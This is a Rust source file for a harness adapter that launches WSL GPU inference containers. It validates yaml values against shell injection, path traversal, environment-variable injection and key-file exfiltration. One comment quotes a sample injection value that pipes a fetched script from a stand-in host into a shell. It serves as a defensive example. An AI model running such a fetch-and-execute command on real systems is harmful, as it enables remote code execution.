//! The ninfer engine adapter (DESIGN Step 7; port of the working v3.3 path).
//!
//! Ninfer engines are GPU containers living inside WSL. Since the template-adoption
//! ruling (operator, 2026-10-31) the harness no longer launches operator-written
//! scripts: a model that declares `ninfer_image` gets the canonical script below
//! rendered from its yaml, staged content-addressed into the distro by
//! [`crate::process`], and launched from the staged copy — so every ninfer start
//! complies with what the harness can check and expect (`--restart no`,
//! loopback-only publish, bounded logs, pre-reap). `ninfer_autostart` remains as the
//! compatibility path for pre-template yamls: the operator's script runs verbatim
//! under the same positional contract (`$1` profile, `$2` key|nokey, `$3`
//! host-publish port). Because the container outlives the short-lived `wsl.exe`
//! client, the spec carries the container name so the runtime reaps it with
//! `docker rm -f` on release (v3.3 `Proc::Container` parity), and readiness chains
//! `/health` then `/v1/models` (v3.3 `wait_ready`; SE's `Then` probes both, unlike
//! v3.3's first-step-only unwrap).
//!
//! Every ninfer model the catalog carries is managed: the operator's 2026-10-26
//! call scrapped v3.3's `external: true` so the former bonsai servers are loaded
//! and reaped here like any other. The port comes from the harness's slot plan but
//! reaches the container only as the script's `$3` **offer** — whether the
//! autostart script publishes there is the operator's contract, unverifiable from
//! here (FINDINGS-10 [5]); the harness's own evidence is that its readiness probes
//! answer on that port, nothing more.

use super::{EngineAdapter, EngineError, LaunchSpec, ReadinessSpec};
use crate::model::ModelEntry;
use crate::ownership::{valid_container_name, NINFER_ENGINE};
use std::collections::BTreeMap;

/// Defaults matching v3.3 `appconf` (operator-owned WSL coordinates).
#[derive(Debug, Clone)]
pub struct NinferDefaults {
    /// WSL distro hosting the containers.
    pub wsl_distro: String,
    /// WSL user owning the containers and autostart scripts.
    pub wsl_user: String,
}

/// Ninfer adapter: WSL container launched via the model's autostart script.
#[derive(Debug, Clone)]
pub struct NinferAdapter {
    /// WSL coordinates, wired from config at boot.
    pub defaults: NinferDefaults,
}

/// Whether `value` is safe to hand to WSL as a single word: the argv after
/// `wsl.exe --` is re-tokenized by the login shell there, so a yaml value such as
/// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
/// review, 2026-10-26). Paths and profile names are plain words, never options.
///
/// `~` is deliberately NOT admitted anywhere in a word (FINDINGS2-0910 [6]): bash
/// expands a leading `~` before it ever opens the file, so `~root/x.sh` would reach
/// `/root/x.sh` and `~/x.sh` the wsl_user's home — a yaml word that looks like an
/// absolute path in the catalog but names a file the operator did not write. The
/// rule is the character class rather than bash's expansion positions: an interior
/// `~` (inert to the shell) is refused too, deliberately, so one charset is the
/// whole story. Every autostart path in the live catalog is already absolute
/// (`/home/...`), and profile words never need it. What this rule still does NOT do
/// is bound *which* absolute paths are admissible: the distro-side root allow-list
/// is the ninfer `custody_exec_roots` cell of the [`crate::engine::policy`]
/// `EnginePolicy` table (still open admission in 10a; the custody slice enforces it).
fn valid_word(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@')
        })
}

/// The built-in VRAM profiles the canonical script carries (the operator's table,
/// adopted verbatim): profile → `(max-context, kv-capacity, concurrency, kv-dtype)`.
const BUILT_IN_PROFILES: [(&str, &str, &str, &str, &str); 5] = [
    ("a", "262144", "524288", "2", "fp8"),
    ("b", "262144", "262144", "1", "fp8"),
    ("c", "131072", "131072", "1", "fp8"),
    ("d", "16384", "32768", "2", "nvfp4"),
    ("e", "65536", "65536", "1", "fp8"),
];

/// KV dtypes the harness will encode into a launch. Extending this list is the day
/// the engine grows a dtype the operator asks for; until then an unknown dtype is a
/// refusal naming the key, never a surprise the distro discovers. `int8` and
/// `rk8v4` joined on the operator's demand: the Qwen3.8/Swift FP8 cards' verified
/// lines run int8 KV (the fast-prefill kernel is silently ignored on fp8) and the
/// Bonsai fork's card runs rk8v4 — pinning their acceptance is what keeps a future
/// edit from silently breaking a live yaml's launch.
const ALLOWED_KV_DTYPES: [&str; 6] = ["fp8", "nvfp4", "fp16", "bf16", "int8", "rk8v4"];

/// The environment variables a yaml may set inside the container, as
/// `ninfer_env: NAME=VALUE ...`. This is an **allow-list, not a parse rule**: an
/// arbitrary `NAME=VALUE` would let the yaml inject `LD_PRELOAD` or rewrite
/// `PATH` inside a root-adjacent container, so every admissible name is a
/// reviewed constant with its own closed value set. `CUDA_MODULE_LOADING=LAZY`
/// is the operator's card-verified cold-start flag for the NInfer-all forks
/// (`--gdn-state-fp16`/`--fast-prefill-kernel` line); extending the list is the
/// day a card demands another one, and the addition is a code review, not a
/// yaml edit.
const ALLOWED_ENV_VARS: [(&str, &[&str]); 1] = [("CUDA_MODULE_LOADING", &["EAGER", "LAZY"])];

/// The port a ninfer container binds when its yaml names no `ninfer_internal_port`:
/// the SE container-internal number, 8808 — the harness's own 87xx family at a
/// +100 offset, owned by nobody else (not the manual 80xx world, not the 87xx
/// listeners, not the 181xx engine plan; a later hand must keep it clear of all
/// three, which `AppConfig::port_claim` enforces for declared values). R10
/// (operator 2026-11-01: "8003-8005 are manual only", default amended the same
/// day: "8080 — bad", closer to the harness ports): the container inside is a
/// third namespace, and reusing 8004 internally was what misdirected the whole
/// 8004 post-mortem, while `PUBLISH="${3:?…}"` removed the last path where a
/// missing publish argument could host-publish the internal number itself.
pub const DEFAULT_INTERNAL_PORT: &str = "8808";

/// The internal port a ninfer row will bind, resolved exactly as
/// [`template_params`] resolves it (yaml key, else [`DEFAULT_INTERNAL_PORT`]),
/// for the scheduler-side namespace check. `None` for non-ninfer rows and for
/// ninfer rows whose key does not parse — those die at spawn naming the key, so
/// the check must not invent a number for them.
#[must_use]
pub fn declared_internal_port(entry: &ModelEntry) -> Option<u16> {
    if entry.engine != NINFER_ENGINE {
        return None;
    }
    let raw = optional_param(entry, "ninfer_internal_port")
        .unwrap_or_else(|| DEFAULT_INTERNAL_PORT.to_string());
    if !valid_number(&raw, 1, 65_535) {
        return None;
    }
    raw.parse().ok()
}

/// The identity an `engine_report` figure is comparable to: the selected profile
/// **plus the `--kv-capacity` it resolves to** — the reserved KV is what binds the
/// figure, and a custom profile's override line can move the capacity without the
/// name changing, so comparing the name alone (the first cut) let an edited
/// `ninfer_profile_<name>: … kv=…` keep certifying a reservation it no longer
/// describes. `None` = nothing to compare against: an invalid name/line here was
/// already (or will be) refused at launch, and a voided-on-unresolvable pair is the
/// safe landing. Shared by the spawn anchor and the scan-time void rule, so the two
/// can never resolve a profile differently.
#[must_use]
pub fn profile_stamp(raw: &BTreeMap<String, String>) -> Option<String> {
    let profile = raw
        .get("ninfer_profile")
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| "b".to_string());
    // The scan-time caller has no adapter identity; an unresolvable profile renders
    // the figure incomparable regardless of which refusal name the launch would use.
    let (kv, source) = profile_override("scan", raw, &profile)
        .ok()
        .map(|(_, kv, _, _, source)| (kv, source))?;
    Some(if source == "built-in" {
        profile
    } else {
        format!("{profile}:kv{kv}")
    })
}

/// A custom profile name: lowercase word, short, and safe to interpolate into the
/// script and into the yaml key that carries its override.
fn valid_profile_name(name: &str) -> bool {
    let bytes = name.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= 16
        && bytes[0].is_ascii_lowercase()
        && bytes
            .iter()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || *b == b'_')
}

/// A non-negative decimal number inside `[min, max]`, validated before it is encoded
/// into a launch (bounds: template adoption, 2026-10-31 — a profile whose kv-capacity
/// is below its context cannot serve the context it advertises).
fn valid_number(value: &str, min: u64, max: u64) -> bool {
    !value.is_empty()
        && value.bytes().all(|b| b.is_ascii_digit())
        && value.parse::<u64>().is_ok_and(|n| (min..=max).contains(&n))
}

/// A path word the script resolves *inside* a fixed directory (`$MODEL_NAME`,
/// `$ARTIFACT`): a `..` component would escape the mount the harness set up, so the
/// traversal is refused at render even though every character is shell-bare.
fn valid_path_word(value: &str) -> bool {
    valid_word(value) && !value.split('/').any(|part| part == "..")
}

/// A comma-separated list of plain words (the `--gpus device=` selector).
fn valid_word_list(value: &str) -> bool {
    !value.is_empty() && value.split(',').all(valid_word)
}

/// One `ninfer_serve_args` token: an option token is *supposed* to start with `-`
/// (it goes to `ninfer-serve`, not to the login shell), and a bare value token is
/// admitted too — the engine's own parsers (the Bonsai fork's `serve` AND the
/// stock `ninfer-serve`) reject the `--flag=value` form outright (manual test
/// 2026-11-01: `unknown argument: --spec=dflash2`), so the working space form
/// `--spec dflash2` must stay spellable; every token is quoted at substitution,
/// so a value cannot shell out. The charset stays shell-bare — no space, quote,
/// `$`, backtick, semicolon, pipe, redirect, paren, brace, or `~` — and the
/// harness-owned flags in `forbidden` (the ninfer row's `forbidden_words` cell
/// of the [`crate::engine::policy`] table) are refused. `--model-id` has its own
/// key (`ninfer_model_id`), so it is refused here too. The denylist is checked
/// against an option token's *name* (so `--flag=value` cannot smuggle past a
/// whole-token comparison) and against every strict *prefix* of one, because
/// argparse-style parsers (the Python precedent behind this engine) resolve
/// unique abbreviations: `--max-cont` is `--max-context` to such a parser, and
/// the llama `extra_args` deny-list leak (FINDINGS2-0910, 8/8 smuggles) is the
/// in-repo precedent for closing the abbreviation door rather than betting on
/// the parser being strict. A value token that begins with `-` is refused, so a
/// value can never disguise itself as another flag.
fn valid_serve_arg(token: &str, forbidden: &[&str]) -> bool {
    let name = token.split('=').next().unwrap_or(token);
    !token.is_empty()
        && token.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@' | '=')
        })
        && if name.starts_with('-') {
            // Long options only: this engine's parsers speak `--flag`, and a
            // single-dash token is more likely a stray short flag than a value.
            name.starts_with("--")
                && !forbidden
                    .iter()
                    .any(|flag| name.starts_with(flag) || flag.starts_with(name))
        } else {
            true
        }
}

// The canonical ninfer autostart script template lives in the ninfer row of
// the [`crate::engine::policy`] `EnginePolicy` table (its `serve_template`
// cell, `CANONICAL_NINFER_SCRIPT`); `render_canonical` substitutes it.

/// Every value the canonical script needs, each already validated against the shape
/// its substitution site demands; built by [`template_params`] and consumed by
/// [`render_canonical`].
struct NinferParams {
    profile: String,
    profile_source: String,
    max_ctx: String,
    kv_cap: String,
    conc: String,
    kv_dtype: String,
    name: String,
    image: String,
    model_name: String,
    artifact: String,
    port: String,
    serve_cmd: String,
    model_roots: Vec<String>,
    serve_args: Vec<String>,
    key_file: String,
    key: String,
    gpu_device: String,
    model_id: Option<String>,
    env: Vec<String>,
}

/// Reads one required template key, trimmed and non-empty; the error names the exact
/// key the operator has to fix, the same voice as [`EngineError::MissingField`].
fn required_param(model: &ModelEntry, key: &str) -> Result<String, EngineError> {
    let value = model
        .raw
        .get(key)
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty());
    value.ok_or_else(|| EngineError::MissingField {
        model: model.name.clone(),
        field: key.to_string(),
    })
}

/// Reads one optional template key, trimmed and non-empty.
fn optional_param(model: &ModelEntry, key: &str) -> Option<String> {
    model
        .raw
        .get(key)
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
}

/// Reads one optional key that must be a plain word, defaulting to `fallback`.
fn defaulted_word(model: &ModelEntry, key: &str, fallback: &str) -> Result<String, EngineError> {
    match optional_param(model, key) {
        Some(value) if valid_word(&value) => Ok(value),
        Some(value) => Err(EngineError::Rejected {
            engine: NINFER_ENGINE.to_string(),
            model: model.name.clone(),
            reason: format!(
                "`{key}` must be a plain word (no spaces, no shell metacharacters): {value}"
            ),
        }),
        None => Ok(fallback.to_string()),
    }
}

/// The first present `ninfer_profile_<built-in>` key — one this module's
/// precedence can never read in EITHER launch mode, so both refuse it
/// (review L-2: the legacy branch once ignored it silently).
fn dead_built_in_profile_key(raw: &BTreeMap<String, String>) -> Option<&'static str> {
    BUILT_IN_PROFILES
        .iter()
        .map(|(name, ..)| *name)
        .find(|name| raw.contains_key(&format!("ninfer_profile_{name}")))
}

/// The four numbers a profile stands for, resolved from the built-in table or from
/// the `ninfer_profile_<name>` override key a custom `ninfer_profile:` names. The
/// override is one line of `key=value` pairs so the operator never has to know the
/// script's variable names; every value is bounded before it reaches the launch.
fn profile_override(
    model_name: &str,
    raw: &BTreeMap<String, String>,
    profile: &str,
) -> Result<(String, String, String, String, String), EngineError> {
    let rejected = |reason: String| EngineError::Rejected {
        engine: NINFER_ENGINE.to_string(),
        model: model_name.to_string(),
        reason,
    };
    // A `ninfer_profile_<built-in-name>` line is dead config by this module's
    // own precedence: the table answers a built-in profile first, and an
    // override line is consulted only for a custom name — either way the line
    // is never read. Silently ignoring it is the silent-drift class (manual
    // test 2026-11-01: a `ninfer_profile_b` line promising int8/conc 2 launched
    // fp8/conc 1 with no word), so an override line naming any built-in is a
    // refusal, whatever `ninfer_profile` selects.
    if let Some(name) = dead_built_in_profile_key(raw) {
        return Err(rejected(format!(
            "`ninfer_profile_{name}` can never be read: `{name}` is a built-in profile and the \
             built-in table wins; rename the profile to a custom name"
        )));
    }
    if let Some((_, ctx, kv, conc, dtype)) =
        BUILT_IN_PROFILES.iter().find(|(name, ..)| *name == profile)
    {
        return Ok((
            (*ctx).to_string(),
            (*kv).to_string(),
            (*conc).to_string(),
            (*dtype).to_string(),
            "built-in".to_string(),
        ));
    }
    if !valid_profile_name(profile) {
        return Err(rejected(format!(
            "`ninfer_profile` must be one of a|b|c|d|e or a custom name (lowercase \
             [a-z0-9_], <=16 chars): {profile}"
        )));
    }
    let key = format!("ninfer_profile_{profile}");
    let line = raw
        .get(&key)
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .ok_or_else(|| EngineError::MissingField {
            model: model_name.to_string(),
            field: key.clone(),
        })?;
    let mut fields: BTreeMap<&str, &str> = BTreeMap::new();
    for part in line.split_whitespace() {
        let Some((field, value)) = part.split_once('=') else {
            return Err(rejected(format!(
                "`{key}` entries must be key=value: {part} (keys: ctx, kv, conc, kv_dtype)"
            )));
        };
        if fields.insert(field, value).is_some() {
            return Err(rejected(format!("`{key}` repeats field `{field}`")));
        }
    }
    let take = |field: &str, min: u64, max: u64| -> Result<String, EngineError> {
        let value = fields
            .get(field)
            .copied()
            .ok_or_else(|| rejected(format!("`{key}` is missing field `{field}`")))?;
        if !valid_number(value, min, max) {
            return Err(rejected(format!(
                "`{key}` field `{field}` must be a whole number in [{min}, {max}]: {value}"
            )));
        }
        Ok(value.to_string())
    };
    let ctx = take("ctx", 1, 1_000_000_000)?;
    let kv = take("kv", 1, 1_000_000_000)?;
    let conc = take("conc", 1, 64)?;
    let dtype = fields.get("kv_dtype").copied().unwrap_or("fp8");
    if !ALLOWED_KV_DTYPES.contains(&dtype) {
        return Err(rejected(format!(
            "`{key}` field `kv_dtype` must be one of {}: {dtype}",
            ALLOWED_KV_DTYPES.join(", ")
        )));
    }
    if kv
        .parse::<u64>()
        .is_ok_and(|kv_n| ctx.parse::<u64>().is_ok_and(|ctx_n| kv_n < ctx_n))
    {
        return Err(rejected(format!(
            "`{key}` cannot serve a context (ctx={ctx}) it has no KV pool for (kv={kv})"
        )));
    }
    Ok((ctx, kv, conc, dtype.to_string(), format!("override:{key}")))
}

/// Collects and validates every template parameter from the model's yaml. Every
/// refusal names the key the operator has to fix (G6); nothing is defaulted except
/// the documented optional keys.
fn template_params(model: &ModelEntry, container: &str) -> Result<NinferParams, EngineError> {
    let row = super::policy::engine_policy(NINFER_ENGINE)
        .expect("the compiled-in table ships a ninfer row");
    // The one directory a key file may live in is the row's data-custody root,
    // not a literal repeated in code: single-source per §20-9 Fork C.
    let keys_root = row
        .custody_data_roots
        .first()
        .expect("the ninfer row ships its key custody root");
    let rejected = |reason: String| EngineError::Rejected {
        engine: NINFER_ENGINE.to_string(),
        model: model.name.clone(),
        reason,
    };
    let image = required_param(model, "ninfer_image")?;
    if !valid_word(&image) {
        return Err(rejected(format!(
            "`ninfer_image` must be a plain word: {image}"
        )));
    }
    let model_name = required_param(model, "ninfer_model_name")?;
    if !valid_path_word(&model_name) {
        return Err(rejected(format!(
            "`ninfer_model_name` must be a plain word without `..` traversal: {model_name}"
        )));
    }
    let artifact = required_param(model, "ninfer_artifact")?;
    if !valid_path_word(&artifact) {
        return Err(rejected(format!(
            "`ninfer_artifact` must be a plain word without `..` traversal: {artifact}"
        )));
    }
    // Optional since R10 (operator 2026-11-01: "8003-8005 are manual only"):
    // the container's inside is its own namespace, so the default is the SE
    // internal number rather than any borrowed manual one, and
    // `AppConfig::port_claim` refuses manual/harness numbers at the gate.
    let port = optional_param(model, "ninfer_internal_port")
        .unwrap_or_else(|| DEFAULT_INTERNAL_PORT.to_string());
    if !valid_number(&port, 1, 65_535) {
        return Err(rejected(format!(
            "`ninfer_internal_port` must be a port number: {port}"
        )));
    }
    let roots_line = required_param(model, "ninfer_model_roots")?;
    let model_roots: Vec<String> = roots_line
        .split(',')
        .map(str::trim)
        .filter(|root| !root.is_empty())
        .map(str::to_string)
        .collect();
    if model_roots.is_empty() {
        return Err(rejected(
            "`ninfer_model_roots` must list at least one WSL directory".to_string(),
        ));
    }
    for root in &model_roots {
        if !valid_path_word(root) || !root.starts_with('/') {
            return Err(rejected(format!(
                "`ninfer_model_roots` entries must be absolute plain WSL paths \
                 without `..` traversal (no spaces, no shell metacharacters): {root}"
            )));
        }
    }
    let serve_cmd = defaulted_word(model, "ninfer_serve_cmd", "ninfer-serve")?;
    let gpu_device = optional_param(model, "ninfer_gpu_device").unwrap_or_else(|| "0".to_string());
    if !valid_word_list(&gpu_device) {
        return Err(rejected(format!(
            "`ninfer_gpu_device` must be a comma-separated word list: {gpu_device}"
        )));
    }
    let profile = optional_param(model, "ninfer_profile").unwrap_or_else(|| "b".to_string());
    let (max_ctx, kv_cap, conc, kv_dtype, profile_source) =
        profile_override(&model.name, &model.raw, &profile)?;
    let serve_args: Vec<String> = optional_param(model, "ninfer_serve_args")
        .map(|line| line.split_whitespace().map(str::to_string).collect())
        .unwrap_or_default();
    for arg in &serve_args {
        if !valid_serve_arg(arg, row.forbidden_words) {
            return Err(rejected(format!(
                "`ninfer_serve_args` tokens must be shell-bare serve flags (option-shaped, \
                 no spaces or shell metacharacters, never a harness-owned flag such as \
                 --host/--port/--api-key/--model-id): {arg}"
            )));
        }
    }
    let model_id = match optional_param(model, "ninfer_model_id") {
        Some(id) if valid_word(&id) => Some(id),
        Some(id) => {
            return Err(rejected(format!(
                "`ninfer_model_id` must be a plain word: {id}"
            )))
        }
        None => None,
    };
    // The key file names its location with `$HOME`, never `~/`: bash expands a tilde
    // at a word start, and a *variable assignment* does not expand one at all — so
    // `API_KEY_FILE="~/keys/x.key"` would look for a literal `~` directory. `$HOME`
    // inside the quoted assignment expands reliably. The directory is NOT
    // operator-steerable: the canonical script `cat`s this file into `--api-key`, so
    // an arbitrary path would let a yaml export any distro secret (`.ssh/id_rsa`)
    // into `docker run` argv — the key lives in exactly one custody root,
    // `$HOME/.simplehar/keys/<file>.key`, with `<file>` a single bare word
    // (chunk-10 custody doctrine: engines obey only harness-owned locations).
    let key_file = optional_param(model, "ninfer_key_file")
        .unwrap_or_else(|| format!("{keys_root}/{container}.key"));
    let key_file_ok = key_file
        .strip_prefix(&format!("{keys_root}/"))
        .is_some_and(|file| file.ends_with(".key") && valid_path_word(file) && !file.contains('/'));
    if !key_file_ok {
        return Err(rejected(format!(
            "`ninfer_key_file` must be a plain file inside `{keys_root}/` ending in \
             `.key` (no traversal, no subdirectories, no shell metacharacters): {key_file}"
        )));
    }
    let key = if model
        .raw
        .get("ninfer_key")
        .map(String::as_str)
        .is_some_and(crate::model::truthy)
    {
        "key"
    } else {
        "nokey"
    };
    let env: Vec<String> = optional_param(model, "ninfer_env")
        .map(|line| line.split_whitespace().map(str::to_string).collect())
        .unwrap_or_default();
    for token in &env {
        let ok = ALLOWED_ENV_VARS.iter().any(|(name, values)| {
            token
                .strip_prefix(&format!("{name}="))
                .is_some_and(|value| values.contains(&value))
        });
        if !ok {
            return Err(rejected(format!(
                "`ninfer_env` tokens must be an allow-listed NAME=VALUE ({}): {token}",
                ALLOWED_ENV_VARS
                    .iter()
                    .map(|(name, values)| format!("{name}={}", values.join("|")))
                    .collect::<Vec<_>>()
                    .join(", ")
            )));
        }
    }
    Ok(NinferParams {
        profile,
        profile_source,
        max_ctx,
        kv_cap,
        conc,
        kv_dtype,
        name: container.to_string(),
        image,
        model_name,
        artifact,
        port,
        serve_cmd,
        model_roots,
        serve_args,
        key_file,
        key: key.to_string(),
        gpu_device,
        model_id,
        env,
    })
}

/// Substitutes every placeholder in the row's `serve_template` cell
/// ([`crate::engine::policy::CANONICAL_NINFER_SCRIPT`]). Each value is
/// validated at its own substitution site, so a leftover `{{...}}` is
/// structurally impossible — kept as a hard assertion rather than trust (a
/// template edit that adds a placeholder must fail the load, not launch a
/// script with braces in it).
fn render_canonical(params: &NinferParams) -> Result<String, EngineError> {
    let template = super::policy::engine_policy(NINFER_ENGINE)
        .and_then(|row| row.serve_template)
        .expect("the compiled-in table ships the ninfer serve template");
    let roots = params
        .model_roots
        .iter()
        .map(|root| format!("  \"{root}\""))
        .collect::<Vec<_>>()
        .join("\n");
    let serve_args = params
        .serve_args
        .iter()
        .map(|arg| format!("\"{arg}\""))
        .collect::<Vec<_>>()
        .join(" ");
    let model_id_arg = params
        .model_id
        .as_deref()
        .map_or_else(String::new, |id| format!("--model-id \"{id}\" \\\n  "));
    // Each token is one reviewed `NAME=VALUE` from `ALLOWED_ENV_VARS`; quoting it
    // keeps the value literal to `docker run`, and the allow-list is what makes an
    // arbitrary `NAME` (e.g. `LD_PRELOAD`) unrepresentable in the first place.
    let env_args = params
        .env
        .iter()
        .map(|pair| format!("--env \"{pair}\" \\\n  "))
        .collect::<String>();
    let script = template
        .replace("{{PROFILE_SOURCE}}", &params.profile_source)
        .replace("{{PROFILE}}", &params.profile)
        .replace("{{MAX_CTX}}", &params.max_ctx)
        .replace("{{KV_CAP}}", &params.kv_cap)
        .replace("{{CONC}}", &params.conc)
        .replace("{{KV_DTYPE}}", &params.kv_dtype)
        .replace("{{NAME}}", &params.name)
        .replace("{{IMAGE}}", &params.image)
        .replace("{{MODEL_NAME}}", &params.model_name)
        .replace("{{ARTIFACT}}", &params.artifact)
        .replace("{{PORT}}", &params.port)
        .replace("{{SERVE_CMD}}", &params.serve_cmd)
        .replace("{{MODEL_ROOTS}}", &roots)
        .replace("{{SERVE_ARGS}}", &serve_args)
        .replace("{{KEY_FILE}}", &params.key_file)
        .replace("{{KEY}}", &params.key)
        .replace("{{GPU_DEVICE}}", &params.gpu_device)
        .replace("{{ENV_ARGS}}", &env_args)
        .replace("{{MODEL_ID_ARG}}", &model_id_arg);
    if script.contains("{{") {
        return Err(EngineError::Rejected {
            engine: NINFER_ENGINE.to_string(),
            model: params.name.clone(),
            reason: "the canonical template left an unsubstituted placeholder".to_string(),
        });
    }
    Ok(script)
}

impl NinferAdapter {
    /// Creates the adapter with the config's WSL coordinates.
    pub fn new(wsl_distro: impl Into<String>, wsl_user: impl Into<String>) -> Self {
        NinferAdapter {
            defaults: NinferDefaults {
                wsl_distro: wsl_distro.into(),
                wsl_user: wsl_user.into(),
            },
        }
    }

    /// The autostart argv exactly as v3.3 built it: shared WSL client prefix,
    /// then bash, script, profile, key flag, and the port offered as `$3` — the
    /// harness's slot-plan port, which the script decides whether to publish
    /// (the header's offer/contract sentence; 10[5]).
    fn argv(&self, script: &str, profile: &str, key: &str, port: u16) -> Vec<String> {
        let mut argv =
            crate::engine::wsl_prefix(&self.defaults.wsl_distro, &self.defaults.wsl_user);
        argv.extend([
            "bash".to_string(),
            script.to_string(),
            profile.to_string(),
            key.to_string(),
            port.to_string(),
        ]);
        argv
    }
}

impl EngineAdapter for NinferAdapter {
    fn engine_id(&self) -> &str {
        NINFER_ENGINE
    }

    fn spec(&self, model: &ModelEntry, port: u16) -> Result<LaunchSpec, EngineError> {
        let rejected = |reason: String| EngineError::Rejected {
            engine: NINFER_ENGINE.to_string(),
            model: model.name.clone(),
            reason,
        };
        // The WSL account is operator-specific and has no shipped default (config
        // review, 2026-10-26): refuse with the field named rather than hand `wsl.exe`
        // an empty `-u` and let the spawn fail obscurely.
        if self.defaults.wsl_user.trim().is_empty() {
            return Err(rejected(
                "`wsl_user` is not set in the config file: name the WSL account that owns \
                 these containers"
                    .to_string(),
            ));
        }
        // Both required, exactly as v3.3 refused them at launch.
        let missing = |field: &str| EngineError::MissingField {
            model: model.name.clone(),
            field: field.to_string(),
        };
        let container = model
            .raw
            .get("ninfer_container")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .ok_or_else(|| missing("ninfer_container"))?;
        if !valid_container_name(&container) {
            return Err(rejected(format!(
                "ninfer_container must be a docker name (alphanumeric start, \
                 [A-Za-z0-9._-] only, never a container-ID shape): {container}"
            )));
        }
        let profile = model
            .raw
            .get("ninfer_profile")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| "b".to_string());
        if !valid_word(&profile) {
            return Err(rejected(format!(
                "ninfer_profile must be a plain word (no spaces or shell metacharacters): {profile}"
            )));
        }
        // Dead built-in-name override lines are refused in EITHER launch mode:
        // the template path refuses through `profile_override`, and the legacy
        // path — which never resolves the override — must refuse too rather
        // than pass `$1` and ignore the line silently (review L-2).
        if let Some(dead) = dead_built_in_profile_key(&model.raw) {
            return Err(rejected(format!(
                "`ninfer_profile_{dead}` can never be read: `{dead}` is a built-in profile \
                 and the built-in table wins; rename the profile to a custom name"
            )));
        }
        let key = if model
            .raw
            .get("ninfer_key")
            .map(String::as_str)
            .is_some_and(crate::model::truthy)
        {
            "key"
        } else {
            "nokey"
        };
        // Two launch sources, one rule: whatever runs must be something the harness
        // can check and expect (operator ruling 2026-10-31). `ninfer_image` selects
        // the canonical template — the harness renders it, stages the bytes, and
        // launches the staged copy. `ninfer_autostart` selects the operator's own
        // script, verbatim: kept as the compatibility path for yamls written before
        // the template (a legacy script's contract is the same positional argv), not
        // as a way to bypass validation. Declaring both is a refusal, not a priority:
        // a model either runs under the harness's word or the operator's, never in
        // the ambiguous middle.
        let autostart = model
            .raw
            .get("ninfer_autostart")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty());
        let template_mode = model
            .raw
            .get("ninfer_image")
            .map(|v| !v.trim().is_empty())
            .unwrap_or(false);
        let (script_path, script) = match (template_mode, autostart) {
            (true, Some(_)) => {
                return Err(rejected(
                    "`ninfer_image` (canonical template) and `ninfer_autostart` (operator \
                     script) are mutually exclusive: a launch has exactly one source"
                        .to_string(),
                ))
            }
            (true, None) => {
                let params = template_params(model, &container)?;
                let script = render_canonical(&params)?;
                let name = format!(
                    "{container}-{:016x}.sh",
                    crate::process::script_content_hash(&script)
                );
                (name, Some(script))
            }
            (false, Some(script)) => {
                if !valid_word(&script) {
                    return Err(rejected(format!(
                        "ninfer_autostart must be a plain WSL path (no spaces, no shell \
                         metacharacters, no leading `~`): {script}"
                    )));
                }
                (script, None)
            }
            (false, None) => return Err(missing("ninfer_autostart")),
        };
        Ok(LaunchSpec {
            argv: self.argv(&script_path, &profile, key, port),
            // The client's cwd is irrelevant: everything runs inside WSL.
            cwd: std::env::temp_dir(),
            env: BTreeMap::new(),
            log_name: model.name.clone(),
            readiness: ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            ),
            container: Some(container.to_string()),
            script,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::CategoryId;
    use crate::model::CostClass;

    fn raw(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    fn entry(pairs: &[(&str, &str)]) -> ModelEntry {
        let mut pairs: Vec<(&str, &str)> = pairs.to_vec();
        pairs.push(("name", "ninfer-test"));
        ModelEntry {
            name: "ninfer-test".to_string(),
            engine: "ninfer".to_string(),
            category: CategoryId::Work,
            vram_gb: Some(34.0),
            gguf_size_gb: None,
            cost: CostClass::Fixed,
            launch_floor_gb: None,
            load_timeout_s: Some(600),
            measured_gb: None,
            measured_min_gb: None,
            measured_offload: None,
            measured_attribution: None,
            measured_profile: None,
            model_ref: Some("ninfer://ninfer-x:8004/served".to_string()),
            serve_model: Some("served".to_string()),
            file: None,
            raw: raw(&pairs),
        }
    }

    #[test]
    fn spec_refuses_by_naming_wsl_user_when_the_account_is_unset() {
        // No username ships as a default, so the load has to explain the fix rather
        // than hand `wsl.exe` an empty `-u` and fail obscurely.
        let err = NinferAdapter::new("Ubuntu", "")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect_err("a blank account cannot launch");
        assert!(err.to_string().contains("wsl_user"), "was: {err}");
    }

    #[test]
    fn argv_matches_the_v33_positional_contract() {
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv,
            vec![
                "wsl.exe",
                "-d",
                "Ubuntu",
                "-u",
                "ops",
                "--",
                "bash",
                "/home/u/guide/ninfer-x/autostart.sh",
                "b",
                "nokey",
                "18109",
            ]
        );
        assert_eq!(spec.log_name, "ninfer-test");
        assert_eq!(spec.container.as_deref(), Some("ninfer-x"));
        assert_eq!(
            spec.readiness,
            ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
